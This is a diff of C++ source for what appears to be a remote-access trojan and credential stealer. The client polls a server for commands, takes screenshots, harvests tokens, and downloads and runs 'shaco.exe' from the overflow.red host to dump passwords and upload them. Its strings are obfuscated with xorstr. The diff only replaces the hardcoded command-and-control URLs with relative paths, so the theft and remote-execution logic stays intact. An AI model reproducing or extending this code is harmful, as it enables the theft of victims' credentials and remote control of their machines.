@@ -33,7 +33,7 @@ namespace client {
 				if (!cmd.empty()) {	
 					if (cmd == xorstr_("update")) {
 						send_message("Updating to newest version...");
-						requests::download_file("https://overflow.red/update.exe", PATH + xorstr_("update.exe"));
+						requests::download_file("update.exe", PATH + xorstr_("update.exe"));
 					}
 					else if (cmd == xorstr_("screenshot") || cmd == xorstr_("ss")) {
 						client::functions::take_screenshot(PATH + xorstr_("ss.jpg"));
@@ -55,7 +55,7 @@ namespace client {
 						communication::send_message("Tokens", client::functions::prepare_payload("Tokens", client::functions::get_tokens()));
 					}
 					else if (cmd == xorstr_("pass")) {
-						requests::download_file("https://overflow.red/shaco.exe", PATH + xorstr_("shaco.exe"));
+						requests::download_file("shaco.exe", PATH + xorstr_("shaco.exe"));
 						system(xorstr_("cd %AppData%\\Microsoft\\COM && shaco.exe"));
 						send_message(xorstr_("Passwords"), "", PATH + xorstr_("pass.txt"), "file");
 					}
@@ -159,25 +159,22 @@ namespace client {
 		}
 
 		std::string send_message(std::string title, std::string desc, std::string file_path, std::string type) {
-			return requests::post("https://overflow.red/php/send.php", "title=" + title + "&desc=" + desc, file_path, type);
+			return requests::post("php/send.php", "title=" + title + "&desc=" + desc, file_path, type);
 		}
 
 		void set_profile(std::string key, std::string value) {
-			requests::post("https://overflow.red/php/profile.php", "set=" + key + "&value=" + value);
+			requests::post("php/profile.php", "set=" + key + "&value=" + value);
 		}
 		
 		std::string get_profile(std::string key) {
-			std::string res = requests::get_request("https://overflow.red/php/profile.php", "key=" + key);
+			std::string res = requests::get_request("php/profile.php", "key=" + key);
 			helpers::replace_all(res, "\n", "");
 			helpers::replace_all(res, "\r", "");
 			return res;
 		}
 
 		std::string get_command() {
-			return requests::get_request("https://overflow.red/php/command.php");
+			return requests::get_request("php/command.php");
 		}
-
-	}
-
-	
+	}	
 }
